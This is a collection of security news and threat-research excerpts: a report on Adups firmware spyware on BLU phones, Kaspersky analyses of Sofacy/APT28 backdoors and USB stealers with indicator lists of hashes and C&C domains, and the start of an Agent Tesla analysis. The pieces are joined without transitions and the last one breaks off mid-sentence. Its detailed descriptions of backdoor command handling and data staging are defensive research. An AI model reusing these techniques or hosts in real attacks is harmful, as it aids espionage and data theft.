phone was transmitting text messages to a server in Shanghai and was registered to Adups, according to a Kryptowire report.Kryptowire took its findings to the United States government. It made its report public on Tuesday.Marsha Catron, a spokeswoman for the Department of Homeland Security, said the agency “was recently made aware of the concerns discovered by Kryptowire and is working with our public and private sector partners to identify appropriate mitigation strategies.”Kryptowire is a Homeland Security contractor but analyzed the BLU phone independent of that contract.Mr. Ohev-Zion, the BLU chief executive, said he was confident that the problem had been resolved for his customers. “Today there is no BLU device that is collecting that information,” he said.AdvertisementContinue reading the main storySite IndexGo to Home Page »newshome pageworldU.S.politicsElection 2020New Yorkbusinesstechscienceclimatesportsobituariesthe upshotEspañol中文网today's

See Also: Osterman Research: Best Practices for GDPR and CCPA Compliance\\nThe New York Times reported on Nov. 15 that Kryptowire, a mobile enterprise security company, discovered the code on a lower-end smartphone made by BLU Products of Doral, Fla. The phones are sold at Best Buy and Amazon.com, among other retail outlets.\\nKryptowire says the code, which it found on a BLU R1 HD devices, transmitted fine-grained location information and allowed for the remote installation of other apps. Text message and call logs were transmitted every 72 hours to the Shanghai server, and once a day for other personally identifiable data, the company says.\\nIt turns out, however, that other security researchers noticed suspicious and faulty code on BLU devices as early as March 2015, and it has taken nearly that long to remove it from the company\\'s devices.\\nThe finding, in part, shows the risk that can come in opting for less expensive smartphones, whose manufacturers may not diligently fix security vulnerabilities. It\\'s also raising eyebrows because of the connection with China, which has frequently sparred with the U.S. over cyber espionage.\\nBLU Products has now updated its phones to remove the spying code, which most likely would have never been detected by regular users. The code never informed phone users that\\nit was collecting that data, a behavior uniformly viewed by many as a serious security concern.\\nThe developer of the code, Shanghai Adups Technology Co., has apologized, contending that the code was intended for another one of its clients who requested better blocking of junk text messages and marketing calls.\\nVulnerabilities Reported\\nBLU Products, founded in 2009, makes lower-end Android-powered smartphones that sell for as little as $50 on Amazon. Like many original equipment manufacturers, it uses software components from other developers.\\nThe company uses a type of software from Adups that\\'s nicknamed FOTA, short for firmware over-the-air. The software manages the delivery of firmware updates over-the-air, the term used for transmission via a mobile network. Firmware is low-level code deep in an operating system that often has high access privileges, so it\\'s critical that it\\'s verified and contains no software vulnerabilities.\\nLong before Kryptowire\\'s announcement, Tim Strazzere, a mobile security researcher with RedNaga Security, contacted BLU Products in March 2015 after he found two vulnerabilities that could be traced to Adup\\'s code. Those vulnerabilities could have enabled someone to gain broad access to an Android device.\\nStrazzere\\'s colleague, Jon Sawyer, suggested on Twitter that the vulnerabilities might have not been there by mistake, but rather included as intentionally coded backdoors. He posted a tweet to The New York Times report, sarcastically writing, \"If only two people had called this company out for their backdoors several times over the last few years.\"\\nStrazzere\\'s experience in trying to contact both vendors last year is typical of the frustrations frequently faced by security researchers.\\n\"I tried reaching out to Adups and never heard back,\" Strazzere tells Information Security Media Group. \"BLU said they had no security department when I emailed them.\"\\nStrazzere says he also failed to reach MediaTek, a Taiwanese fabless semiconductor manufacturer whose chipsets that powered BLU phones also contained Adups software. To their credit, both Google and Amazon appear to have put pressure on device manufacturers to fix their devices when flaws are found, Strazzere says.\\nFor Google, Android security issues - even if not in the core operating code - are a reputation threat, and for Amazon, a product quality issue. But devices sold outside of Amazon \"might not have ever seen fixes,\" he says.\\nOfficials at BLU couldn\\'t be immediately reached for comment.\\nAttitude Change\\nThe disinterest in the issues appears to have changed with The New York Times report, which lit a fire underneath Adups and BLU.\\nAdups addressed the issue in a Nov. 16 news release, writing that some products made by BLU were updated in June with a version of its FOTA that had actually been intended for other clients who had requested an ability to stop text spam.\\nThat version flags messages \"containing certain language associated with junk texts and flags numbers associated with junk calls and not in a user\\'s contacts,\" the company says.\\nManufacturers should be keeping close tabs on what software ends up on their devices. But it would appear that BLU only took action after Kryptowire notified it along with Google, Adups and Amazon.\\n\"When BLU raised objections, Adups took immediate measures to disable that functionality on BLU phones,\" Adups says.\\nThe greater worry is that these situations may sometimes not be simple mistakes. Security experts have long warned of the ability of advanced adversaries to subvert hardware and software supply chains. Also, the software vulnerabilities pointed out in the FOTA software by Strazzere in 2015 could have been taken advantage of by cybercriminals looking to steal bank account details or execute other frauds.\\nStrazzere advises that consumers should look at the pedigree of mobile manufacturers and take a close look at their security track record before making a decision on what device to buy.\\n\"In the end, the consumer needs to vote with their wallet,\" he says.\\nEnterprise Mobility Management / BYOD\\nGovernance & Risk Management\\nPrivacy\\nTwitter\\nFacebook\\nLinkedIn\\nCredit Eligible\\nGet Permission\\nPreviousTrump\\'s Call to \\'Dismantle\\' Dodd-Frank: The Effect on Banks\\nNext Congress Explores How to Bolster IoT Cybersecurity\\nAbout the Author\\nJeremy Kirk\\nManaging Editor, Security and Technology, ISMG\\nKirk is a veteran journalist who has reported from more than a dozen countries.

high profile targets with updated toolset\\nBy GReAT\\non December 4, 2015. 10:59 am\\nSofacy (also known as “Fancy Bear”, “Sednit”, “STRONTIUM” and “APT28”) is an advanced threat group that has been active since around 2008, targeting mostly military and government entities worldwide, with a focus on NATO countries.\\nMore recently, we have also seen an increase in activity targeting Ukraine.\\nBack in 2011-2012, the group used a relatively tiny implant (known as “Sofacy” or SOURFACE) as its first stage malware. The implant shared certain similarities with the old Miniduke implants. This led us to believe the two groups were connected, at least to begin with, although it appears they parted ways in 2014, with the original Miniduke group switching to the CosmicDuke implant.\\nAt some point during 2013, the Sofacy group expanded its arsenal and added more backdoors and tools, including CORESHELL, SPLM (aka Xagent, aka CHOPSTICK), JHUHUGIT (which is built with code from the Carberp sources), AZZY (aka ADVSTORESHELL, NETUI, EVILTOSS, and spans across four to five generations) and a few others. We’ve seen quite a few versions of these implants and they were relatively widespread for a time.\\n#Sofacy group has been active since 2008, targeting mostly military and government entities in NATO countriesTweet\\nEarlier this year, we noticed a new release of the AZZY implant which, at the time, was largely undetected by anti-malware products. We observed several waves of attacks using this version, most recently in October. The new waves of attacks also included a new generation of USB stealers deployed by the Sofacy actor, with the first versions dating back to February 2015, and which appear to be geared exclusively towards high profile targets.\\nSofacy’s August 2015 attack wave\\nIn the months leading up to August, the Sofacy group launched several waves of attacks relying on zero-day exploits in Microsoft Office, Oracle Sun Java, Adobe Flash Player and Windows itself. For instance, its JHUHUGIT implant was delivered through a Flash zero-day and used a Windows EoP exploit to break out of the sandbox. The JHUHUGIT implant became a relatively popular first stage for the Sofacy attacks and was used again with a Java zero-day (CVE-2015-2590) in July 2015.\\nWhile the JHUHUGIT (and more recently, “JKEYSKW”) implant used in most of the Sofacy attacks, high profile victims are being targeted with another first level implant, representing the latest evolution of their AZZYTrojan.\\nTwo recurring characteristics of the #Sofacy group are speed and the use of multi-backdoor packagesTweet\\nThe first versions of the new AZZY implant appeared in August of this year. During a high profile incident we investigated, our products successfully detected and blocked a “standard” Sofacy “AZZY” sample that was used to target a range of defense contractors. The sample used in this attack (md5 A96F4B8AC7AA9DBF4624424B7602D4F7, compiled July 29th, 2015) was a pretty standard Sofacy x64 AZZY implant, which has the internal name “advshellstore.dll”.\\nInterestingly, the fact that the attack was blocked didn’t appear to stop the Sofacy team. Just an hour and a half later they had compiled and delivered another AZZY x64 backdoor (md5: 9D2F9E19DB8C20DC0D20D50869C7A373, compiled August 4th, 2015). This was no longer detectable with static signatures by our product. However, it was detected dynamically by the host intrusion prevention subsystem when it appeared in the system and was executed.\\nThis recurring, blindingly-fast Sofacy attack attracted our attention as neither sample was delivered through a zero-day vulnerability — instead, they appeared to be downloaded and installed by another malware. This separate malware was installed by an unknown attack as “AppData\\\\Local\\\\Microsoft\\\\Windows\\\\msdeltemp.dll” (md5: CE8B99DF8642C065B6AF43FDE1F786A3).\\nThe top level malware, CE8B99DF8642C065B6AF43FDE1F786A3 (named by its authors “msdeltemp.dll” according to internal strings, and compiled July 28th, 2015) is a rare type of the Sofacy AZZY implant.\\nIt has been modified to drop a separate C&C helper, (md5: 8C4D896957C36EC4ABEB07B2802268B9) as “tf394kv.dll“.\\nThe dropped “tf394kv.dll” file is an external C&C communications library, compiled on July 24th, 2015 and used by the main backdoor for all Internet-based communications.\\nDecrypted configuration block of the C&C helper library “tf394kv.dll“\\nThis code modification marks an unusual departure from the typical AZZY backdoors, with its C&C communication functions moved to an external DLL file. In the past, the Sofacy developers modified earlier AZZY backdoors to use a C&C server encoded in the registry, instead of storing it in the malware itself, so this code modularisation follows the same line of thinking.\\nIn addition to the new AZZY backdoors with side-DLL for C&C, we observed a new set of data-theft modules deployed against victims by the Sofacy group. Among the most popular modern defense mechanisms against APTs are air-gaps — isolated network segments without Internet access, where sensitive data is stored. In the past, we’ve seen groups such as Equation and Flame use malware to steal data from air-gapped networks. The Sofacy group uses such tools as well.\\nThe first versions of these new USB stealer modules appeared around February 2015 and the latest appear to have been compiled in May 2015. Older versions of these USBSTEALER modules were previously described by our colleagues from ESET.\\nOne example of the new Sofacy USBSTEALER modules is 8b238931a7f64fddcad3057a96855f6c, which is named internally as msdetltemp.dll.\\nThis data theft module appears to have been compiled in May 2015 and is designed to watch removable drives and collect files from them, depending on a set of rules defined by the attackers. The stolen data is copied into a hidden directory as “%MYPICTURES%\\\\%volume serial number%“, from where it can be exfiltrated by the attackers using one of the AZZY implants. More details on the new USB stealers are available in the section on technical analysis.\\nConclusions\\nOver the last year, the Sofacy group has increased its activity almost tenfold when compared to previous years, becoming one of the most prolific, agile and dynamic threat actors in the arena. This activity spiked in July 2015, when the group dropped two completely new exploits, an Office and Java zero-day.\\nAt the beginning of August, Sofacy began a new wave of attacks, focusing on\\ndefense-related targets. As of November 2015, this wave of attacks is ongoing. The attackers deploy a rare modification of the AZZY backdoor, which is used for the initial reconnaissance. Once a foothold is established, they try to upload more backdoors, USB stealers as well as other hacking tools such as “Mimikatz” for lateral movement.\\nOver the last year, the #Sofacy group has increased its activity almost tenfold, that spiked in July 2015Tweet\\nTwo recurring characteristics of the Sofacy group that we keep seeing in its attacks are speed and the use of multi-backdoor packages for extreme resilience. In the past, the group used droppers that installed both the SPLM and AZZY backdoors on the same machine. If one of them was detected, the other one provided the attacker with continued access.\\nAs usual, the best defense against targeted attacks is a multi-layered approach. Combine traditional anti-malware technologies with patch management, host intrusion detection and, ideally, whitelisting and default-deny strategies. According to a study by the Australian DSD, 85% of the targeted attacks analysed could have been stopped by four simple defense strategies. While it’s impossible to achieve 100% protection, in practice and most cases all you have to do is increase your defenses to the point where it becomes too expensive for the attacker – who will just give up and move on to other targets.\\nMore information about the Sofacy group is available to customers of Kaspersky Intelligent Services.\\nIs there a ‘silver bullet’ to protect yourself against Sofacy?

In addition to that, API function names are reversed, presumably to avoid detection in memory.\\nOnce started, the code in the main thread resolves the basic API functions it needs and loads an additional library from the following location: “%TEMP%\\\\tf394kv.dll”. If this file is not present, it is recreated from a hardcoded encrypted array inside the body of the DLL.\\nNext, the module enters an infinite loop. Every five minutes it collects basic system information and sends it to the C2 server:\\nWindows version number\\nHardcoded string “4.3” (the backdoor’s internal version number)\\nList of running processes\\nThe main thread also spawns a separate thread for receiving new commands from the C2 servers. Every 10 minutes, it sends a new request to the server. The server is expected to send back executable code and one of the following commands:\\nWrite a new file “%LOCAL_APPDATA%\\\\dllhost.exe” or “%TEMP%\\\\dllhost.exe” and execute it, then delete the file\\nWrite a new file “%LOCAL_APPDATA%\\\\sechost.dll” or “%TEMP%\\\\sechost.dll” and call its first exported function using\\n“rundll32.exe” or Windows API, then delete the file\\nRun shellcode provided by the server in a new thread\\nWhile processing the commands, the backdoor logs all errors and execution results. The module also reads the contents of the file “%APPDATA%\\\\chkdbg.log” and appends it to the results. It then sends the aggregated log back to the C2 server.\\nThe module aborts the thread receiving C2 command after it fails to correctly execute commands more than six times in a row, i.e. if file or process creation fails.\\nThe export called “k” is a wrapper for the “LoadLibraryA” API function.\\nThe export called “SendDataToServer_2” does exactly what the name means: it encrypts all collected data, encodes it using Base64 encoding and calls its additional library to send the data to the C2 server. The names of the C2 servers are hardcoded.\\nHardcoded C&C servers in the main module\\nThe two C&C’s hardcoded in the configuration block of the main binary are:\\nintelnetservice.com\\nintelsupport.net\\nThe export called “Applicate” runs a standard Windows application message loop until a “WM_ENDSESSION” message is received.

If the file exists it then moves it to “__tmpdt.tmp” in the same directory and continues the installation.

The message processing function waits for the WM_DEVICECHANGE event and starts a new thread on its arrival.\\nThe module inspects every new disk volume attached to the system. For every disk it creates a “stash” directory in “%root stash directory location%\\\\%volume serial number in hex%” with attributes FILE_ATTRIBUTE_HIDDEN and FILE_ATTRIBUTE_SYSTEM. The root stash directory location may be read from the configuration file or set to the default location which is “%MYPICTURES%”.\\nThen, it traverses the filesystem of the volume looking for files. Depending on the settings read from the configuration file, the scope may be narrowed to files with particular extensions and/or files created after a specified date.\\nIt is worth noting that if the source file location contains the string “System Volume Information\\\\S-1-5-21-1315235578-283289242\\\\”, then the file is deleted after copying to the “stash” directory.

The only difference introduced is that an event named “WerTyQ34C” can be signalled by the function “NvStop” to terminate the message loop and stop processing.\\nIndicators of compromise:\\nAZZY 4.3 installer:\\nc3ae4a37094ecfe95c2badecf40bf5bb\\nNew generation (4.3) AZZY implants:\\nce8b99df8642c065b6af43fde1f786a3f6f88caf49a3e32174387cacfa144a89\\nDropped C&C helper DLL for AZZY 4.3:\\n8c4d896957c36ec4abeb07b2802268b9\\nFile collectors / USB stealers:\\n0369620eb139c3875a62e36bb7abdae88b238931a7f64fddcad3057a96855f6cce151285e8f0e7b2b90162ba171a4b90f6f88caf49a3e32174387cacfa144a89\\nStand-alone AZZY backdoors:\\na96f4b8ac7aa9dbf4624424b7602d4f79d2f9e19db8c20dc0d20d50869c7a373\\nC&C hostnames:\\ndrivres-update.info\\nintelnetservice.com\\nintelsupport.net\\nsoftupdates.info\\nKaspersky Lab products detect the malware mentioned here with the following names:\\nTrojan.Win32.Sofacy.al\\nTrojan.Win32.Sofacy.be\\nTrojan.Win32.Sofacy.bf\\nTrojan.Win32.Sofacy.bg\\nTrojan.Win32.Sofacy.bi\\nTrojan.Win32.Sofacy.bj\\nTrojan.Win64.Sofacy.q\\nTrojan.Win64.Sofacy.s\\nHEUR:Trojan.Win32.Generic\\nAPT Backdoor Cyber espionage Nation State Sponsored Espionage Sofacy\\nShare post on:\\nFacebook\\nTwitter\\nRelated Posts\\nOilRig’s Poison Frog – old samples, same trick\\nAPT review: what the world’s threat actors got up to in 2019\\nCorporate security prediction 2020\\nLeave a Reply Cancel Reply\\nYour email address will not be published.

Sofacy Activity\\nBy GReAT\\non February 20, 2018. 2:00 pm\\nSofacy, also known as APT28, Fancy Bear, and Tsar Team, is a highly active and prolific APT. From their high volume 0day deployment to their innovative and broad malware set, Sofacy is one of the top groups that we monitor, report, and protect against. 2017 was not any different in this regard. Our private reports subscription customers receive a steady stream of YARA, IOC, and reports on Sofacy, our most reported APT for the year.\\nThis high level of cyber-espionage activity goes back years. In 2011-2012, the group used a relatively tiny implant (known as “Sofacy” or SOURFACE) as their first stage malware, which at the time had similarities with the old Miniduke implants. This made us believe the two groups were connected, although it looks they split ways at a certain point, with the original Miniduke group switching to the CosmicDuke implant in 2014. The division in malware was consistent and definitive at that point.\\nIn 2013, the Sofacy group expanded their arsenal and added more backdoors and tools, including CORESHELL, SPLM (aka Xagent, aka CHOPSTICK), JHUHUGIT (which is built with code from the Carberp sources), AZZY (aka ADVSTORESHELL, NETUI, EVILTOSS, and spans across 4-5 generations) and a few others. We’ve seen quite a few versions of these implants, which were relatively widespread at some point or still are. In 2015 we noticed another wave of attacks which took advantage of a new release of the AZZY implant, largely undetected by antivirus products. The new wave of attacks included a new generation of USB stealers deployed by Sofacy, with initial versions dating to February 2015. It appeared to be geared exclusively towards high profile targets.\\nSofacy’s reported presence in the DNC network alongside APT29 brought possibly the highest level of public attention to the group’s activities in 2016, especially when data from the compromise was leaked and “weaponized”. And later 2016, their focus turned towards the Olympics’ and the World Anti-Doping Agency (WADA) and Court of Arbitration for Sports (CAS), when individuals and servers in these organizations were phished and compromised. In a similar vein with past CyberBerkut activity, attackers hid behind anonymous activist groups like “anonpoland”, and data from victimized organizations were similarly leaked and “weaponized”.\\nThis write-up will survey notables in the past year of 2017 Sofacy activity, including their targeting, technology, and notes on their infrastructure. No one research group has 100% global visibility, and our collected data is presented accordingly. Here, external APT28 reports on 2017 Darkhotel-style activity in Europe and Dealer’s Choice spearphishing are of interest. From where we sit, 2017 Sofacy activity starts with a heavy focus on NATO and Ukrainian partners, coinciding with lighter interest in Central Asian targets, and finishing the second half of the year with a heavy focus on Central Asian targets and some shift further East.\\nDealer’s Choice\\nThe beginning of 2017 began with a slow cleanup following the Dealer’s Choice campaign, with technical characteristics documented by our colleagues at Palo Alto in several stages at the end of 2016. The group spearphished targets in several waves with Flash exploits leading to their carberp based JHUHUGIT downloaders and further stages of malware. It seems that many folks did not log in and pull down their emails until Jan 2017 to retrieve the Dealer’s Choice spearphish. Throughout these waves, we observed that the targets provided connection, even tangential, to Ukraine and NATO military and diplomatic interests.\\nIn multiple cases, Sofacy spoofs the identity of a target, and emails a spearphish to other targets of interest. Often these are military or military-technology and manufacturing related, and here, the DealersChoice spearphish is again NATO related:\\nThe global reach that coincided with this focus on NATO and the Ukraine couldn’t be overstated. Our KSN data showed spearphishing targets geolocated across the globe into 2017.\\nAM, AZ, FR, DE, IQ, IT, KG, MA, CH, UA, US, VN\\nDealersChoice emails, like the one above, that we were able to recover from third party sources provided additional targeting insight, and confirmed some of the targeting within our KSN data:\\nTR, PL, BA, AZ, KR, LV, GE, LV, AU, SE, BE\\n0day Deployment(s)\\nSofacy kicked off the year deploying two 0day in a spearphish document, both a Microsoft Office encapsulated postscript type confusion exploit (abusing CVE-2017-0262) and an escalation of privilege use-after-free exploit (abusing CVE-2017-0263). The group attempted to deploy this spearphish attachment to push a small 30kb backdoor known as GAMEFISH to targets in Europe at the beginning of 2017. They took advantage of the Syrian military conflict for thematic content and file naming “Trump’s_Attack_on_Syria_English.docx”. Again, this deployment was likely a part of their focus on NATO targets.\\nLight SPLM deployment in Central Asia and Consistent Infrastructure\\nMeanwhile in early-to-mid 2017, SPLM/CHOPSTICK/XAgent detections in Central Asia provided a glimpse into ongoing focus on ex-Soviet republics in Central Asia. These particular detections are interesting because they indicate an attempted selective 2nd stage deployment of a backdoor maintaining filestealer, keylogger, and remoteshell functionality to a system of interest. As the latest revision of the backdoor, portions of SPLM didn’t match previous reports on SPLM/XAgent while other similarities were maintained. SPLM 64-bit modules already appeared to be at version 4 of the software by May of the year. Targeting profiles included defense related commercial and military organizations, and telecommunications.\\nTargeting included TR, KZ, AM, KG, JO, UK, UZ\\nHeavy Zebrocy deployments\\nSince mid-November 2015, the threat actor referred to as “Sofacy” or “APT28” has been utilizing a unique payload and delivery mechanism written in Delphi and AutoIT. We collectively refer to this package and related activity as “Zebrocy” and had written a few reports on its usage and development by June 2017 – Sofacy developers modified and redeployed incremented versions of the malware. The Zebrocy chain follows a pattern: spearphish attachment -> compiled Autoit script (downloader) -> Zebrocy payload. In some deployments, we observed Sofacy actively developing and deploying a new package to a much smaller, specific subset of targets within the broader set.\\nTargeting profiles, spearphish filenames, and lures carry thematic content related to visa applications and scanned images, border control administration, and various administrative notes. Targeting appears to be widely spread across the Middle East, Europe, and Asia:\\nBusiness accounting practices and standards\\nScience and engineering centers\\nIndustrial and hydrochemical engineering and standards/certification\\nMinistry of foreign affairs\\nEmbassies and consulates\\nNational security and intelligence agencies\\nPress services\\nTranslation services\\nNGO – family and social service\\nMinistry of energy and industry\\nWe identified new MSIL components deployed by Zebrocy. While recent Zebrocy versioning was 7.1, some of the related Zebrocy modules that drop file-stealing MSIL modules we call Covfacy were v7.0. The components were an unexpected inclusion in this particular toolset. For example, one sent out to a handful of countries identifies network drives when they are added to target systems, and then RC4-like-encrypts and writes certain file metadata and contents to a local path for later exfiltration. The stealer searches for files 60mb and less with these extensions:\\n.doc\\n.docx\\n.xls\\n.xlsx\\n.ppt\\n.pptx\\n.exe\\n.zip\\n.rar\\nAt execution, it installs an application-defined Windows hook. The hook gets windows messages indicating when a network drive has been attached. Upon adding a network drive, the hook calls its “RecordToFile” file stealer method.\\nZebrocy spearphishing targets:\\nAF, AM, AU, AZ, BD, BE, CN, DE, ES, FI, GE, IL, IN, JO, KW, KG, KZ, LB, LT, MN, MY, NL, OM, PK, PO, SA, ZA, SK, SE, CH, TJ, TM, TR, UA, UAE, UK, US, UZ\\nSPLM deployment in Central Asia\\nSPLM/CHOPSTICK components deployed throughout 2017 were native 64-bit modular C++ Windows COM backdoors supporting http over fully encrypted TLSv1 and TLSv1.2 communications, mostly deployed in the second half of 2017 by Sofacy. Earlier SPLM activity deployed 32-bit modules over unencrypted http (and sometimes smtp) sessions. In 2016 we saw fully functional, very large SPLM/X-Agent modules supporting OS X.\\nThe executable module continues to be part of a framework supporting various internal and external components communicating over internal and external channels, maintaining slightly morphed encryption and functionality per deployment. Sofacy selectively used SPLM/CHOPSTICK modules as second stage implants to high interest targets for years now. In a change from previous compilations, the module was structured and used to inject remote shell, keylogger, and filesystem add-ons into processes running on victim systems and maintaining functionality that was originally present within the main module.\\nThe newer SPLM modules are deployed mostly to Central Asian based targets that may have a tie to NATO in some form. These targets include foreign affairs government organizations both localized and abroad, and defense organizations’ presence localized, located in Europe and also located in Afghanistan. One outlier SPLM target profile within our visibility includes an audit and consulting firm in Bosnia and Herzegovina.\\nMinor changes and updates to the code were released with these deployments, including a new mutex format and the exclusive use of encrypted HTTP communications over TLS. The compiled code itself already is altered per deployment in multiple subtle ways, in order to stymie identification and automated analysis and accommodate targeted environments. Strings (c2 domains and functionality, error messages, etc) are custom encrypted per deployment.\\nTargets: TR, KZ, BA, TM, AF, DE, LT, NL\\nSPLM/CHOPSTICK/XAgent Modularity and Infrastructure\\nThis subset of SPLM/CHOPSTICK activity leads into several small surprises that take us into 2018, to be discussed in further detail at SAS 2018. The group demonstrates malleability and innovation in maintaining and producing familiar SPLM functionality, but the pragmatic and systematic approach towards producing undetected or difficult-to-detect malware continues. Changes in the second stage SPLM backdoor are refined, making the code reliably modular.\\nInfrastructure Notes\\nSofacy set up and maintained multiple servers and c2 for varying durations, registering fairly recognizable domains with privacy services, registrars that accept bitcoin, fake phone numbers, phony individual names, and 1 to 1 email address to domain registration relationships. Some of this activity and patterns were publicly disclosed, so we expect to see more change in their process in 2018. Also, throughout the year and in previous years, researchers began to comment publicly on Sofacy’s fairly consistent infrastructure setup.\\nAs always, attackers make mistakes and give away hints about what providers and registrars they prefer. It’s interesting to note that this version of SPLM implements communications that are fully encrypted over HTTPS. As an example, we might see extraneous data in their SSL/TLS certificates that give away information about their provider or resources. Leading up to summer 2017, infrastructure mostly was created with PDR and Internet Domain Service BS Corp, and their resellers. Hosting mostly was provided at Fast Serv Inc and resellers, in all likelihood related to bitcoin payment processing.\\nAccordingly, the server side certificates appear to be generated locally on VPS hosts that exclusively are paid for at providers with bitcoin merchant processing. One certificate was generated locally on what appeared to be a HP-UX box, and another was generated on “8569985.securefastserver.com” with an email address “root@8569985.securefastserver.com”, as seen here for their nethostnet.com domain. This certificate configuration is ignored by the malware.\\nIn addition to other ip data, this data point suggested that Qhoster at https://www.qhoster.com was a VPS hosting reseller of choice at the time. It should be noted that the reseller accepted Alfa Click, PayPal, Payza, Neteller, Skrill, WebMoney, Perfect Money, Bitcoin, Litecoin, SolidTrust Pay, CashU, Ukash, OKPAY, EgoPay, paysafecard, Alipay, MG, Western Union, SOFORT Banking, QIWI, Bank transfer for payment.\\nConclusion\\nSofacy, one of the most active APT we monitor, continues to spearphish their way into targets, reportedly widely phishes for credentials, and infrequently participates in server side activity (including host compromise with BeEF deployment, for example). KSN visibility and detections suggests a shift from their early 2017 high volume NATO spearphish targeting towards the middle east and Central Asia, and finally moving their focus further east into late 2017. Their operational security is good. Their campaigns appear to have broken out into subsets of activity and malware involving GAMEFISH, Zebrocy, and SPLM, to name a few. Their evolving and modified SPLM/CHOPSTICK/XAgent code is a long-standing part of Sofacy activity, however much of it is changing. We’ll cover more recent 2018 change in their targeting and the malware itself at SAS 2018.\\nWith a group like Sofacy, once their attention is detected on a network, it is important to review logins and unusual administrator access on systems, thoroughly scan and sandbox incoming attachments, and maintain two factor authentication for services like email and vpn access. In order to identify their presence, not only can you gain valuable insight into their targeting from intelligence reports and gain powerful means of detections with hunting tools like YARA, but out-of-band processing with a solution like KATA is important.\\nTechnical Appendix\\nRelated md5\\n8f9f697aa6697acee70336f66f295837\\n1a4b9a6b321da199aa6d10180e889313\\n842454b48f5f800029946b1555fba7fc\\nd4a5d44184333442f5015699c2b8af28\\n1421419d1be31f1f9ea60e8ed87277db\\nb1d1a2c64474d2f6e7a5db71ccbafa31\\n953c7321c4959655fdd53302550ce02d\\n57601d717fcf358220340675f8d63c8a\\n02b79c468c38c4312429a499fa4f6c81\\n85cd38f9e2c9397a18013a8921841a04\\nf8e92d8b5488ea76c40601c8f1a08790\\n66b4fb539806ce27be184b6735584339\\ne8e1fcf757fe06be13bead43eaa1338c\\n953c7321c4959655fdd53302550ce02d\\naa2aac4606405d61c7e53140d35d7671\\n85cd38f9e2c9397a18013a8921841a04\\n57601d717fcf358220340675f8d63c8a\\n16e1ca26bc66e30bfa52f8a08846613d\\nf8e92d8b5488ea76c40601c8f1a08790\\nb137c809e3bf11f2f5d867a6f4215f95\\n237e6dcbc6af50ef5f5211818522c463\\n88009adca35560810ec220544e4fb6aa\\n2163a33330ae5786d3e984db09b2d9d2\\n02b79c468c38c4312429a499fa4f6c81\\n842454b48f5f800029946b1555fba7fc\\nd4a5d44184333442f5015699c2b8af28\\nb88633376fbb144971dcb503f72fd192\\n8f9f697aa6697acee70336f66f295837\\nb6f77273cbde76896a36e32b0c0540e1\\n1a4b9a6b321da199aa6d10180e889313\\n1421419d1be31f1f9ea60e8ed87277db\\n1a4b9a6b321da199aa6d10180e889313\\n9b10685b774a783eabfecdb6119a8aa3\\naa34fb2e5849bff4144a1c98a8158970\\naced5525ba0d4f44ffd01c4db2730a34\\nb1d1a2c64474d2f6e7a5db71ccbafa31\\nb924ff83d9120d934bb49a7a2e3c4292\\ncdb58c2999eeda58a9d0c70f910d1195\\nd4a5d44184333442f5015699c2b8af28\\nd6f2bf2066e053e58fe8bcd39cb2e9ad\\n34dc9a69f33ba93e631cd5048d9f2624\\n1c6f8eba504f2f429abf362626545c79\\n139c9ac0776804714ebe8b8d35a04641\\ne228cd74103dc069663bb87d4f22d7d5\\nbed5bc0a8aae2662ea5d2484f80c1760\\n8c3f5f1fff999bc783062dd50357be79\\n5882a8dd4446abd137c05d2451b85fea\\n296c956fe429cedd1b64b78e66797122\\n82f06d7157dd28a75f1fbb47728aea25\\n9a975e0ddd32c0deef1318c485358b20\\n529424eae07677834a770aaa431e6c54\\n4cafde8fa7d9e67194d4edd4f2adb92b\\nf6b2ef4daf1b78802548d3e6d4de7ba7\\nede5d82bb6775a9b1659dccb699fadcb\\n116d2fc1665ce7524826a624be0ded1c\\n20ff290b8393f006eaf4358f09f13e99\\n4b02dfdfd44df3c88b0ca8c2327843a4\\nc789ec7537e300411d523aef74407a5e\\n0b32e65caf653d77cab2a866ee2d9dbc\\n27faa10d1bec1a25f66e88645c695016\\n647edddf61954822ddb7ab3341f9a6c5\\n2f04b8eb993ca4a3d98607824a10acfb\\n9fe3a0fb3304d749aeed2c3e2e5787eb\\n62deab0e5d61d6bf9e0ba83d9e1d7e2b\\n86b607fe63c76b3d808f84969cb1a781\\nf62182cf0ab94b3c97b0261547dfc6cf\\n504182aaa5575bb38bf584839beb6d51\\nd79a21970cad03e22440ea66bd85931f\\nRelated domains\\nnethostnet.com\\nhostsvcnet.com\\netcrem.net\\nmovieultimate.com\\nnewfilmts.com\\nfastdataexchange.org\\nliveweatherview.com\\nanalyticsbar.org\\nanalyticstest.net\\nlifeofmentalservice.com\\nmeteost.com\\nrighttopregnantpower.com\\nkiteim.org\\nadobe-flash-updates.org\\ngeneralsecurityscan.com\\nglobalresearching.org\\nlvueton.com\\naudiwheel.com\\nonline-reggi.com\\nfsportal.net\\nnetcorpscanprotect.com\\nmvband.net\\nmvtband.net\\nviters.org\\ntreepastwillingmoment.com\\nsendmevideo.org\\nsatellitedeluxpanorama.com\\nppcodecs.com\\nencoder-info.tk\\nwmdmediacodecs.com\\npostlkwarn.com\\nshcserv.com\\nversiontask.com\\nwebcdelivery.com\\nmiropc.org\\nsecurityprotectingcorp.com\\nuniquecorpind.com\\nappexsrv.net\\nadobeupgradeflash.com\\nAPT Backdoor Cyber espionage Nation State Sponsored Espionage Sofacy Targeted Attacks Vulnerabilities and exploits Zero-day vulnerabilities\\nShare post on:\\nFacebook\\nTwitter\\nRelated Posts\\nOperation AppleJeus Sequel\\nOilRig’s Poison Frog – old samples, same trick\\nKaspersky Security Bulletin 2019.

      "'Analysis of New Agent Tesla Spyware Variant\\nBlog\\nBusiness & Technology\\nThreat Research\\nIndustry Trends\\nPartners\\nThreat Research\\nAnalysis of New Agent Tesla Spyware Variant\\nBy\\nXiaopeng Zhang\\n| April 05, 2018\\nAnalysis of New Agent Tesla Spyware Variant\\nRecently, FortiGuard Labs captured a new malware sample that was spread via Microsoft Word documents.\\xa0 After some quick research, I discovered that this was a new variant of the Agent Tesla spyware. I analyzed another sample of this spyware last June and published a blog about it. In this blog, I want to share what’s new in this new variant.\\nThis malware was spread via a Microsoft Word document that contained an embedded exe file. Figure 1 below shows what it looks like when you open the Word document.\\nFigure 1. Opening the malicious Word document\\nAs you can see, it asks the victim to double click the blue icon to enable a “clear view.” Once clicked, it extracts an exe file from the embedded object into the system’s temporary folder and runs it.\\xa0 In this case, the exe file is called “POM.exe”.\\nFigure 2. POM.exe is created in a temporary folder\\nAnalysis of POM.exe\\nFigure 3. Looking at POM.exe in an analysis tool\\nIn figure 3 we can see that the malware is written in the MS Visual Basic language. Based on my analysis, it’s a kind of installer program. When it runs, it drops two files: 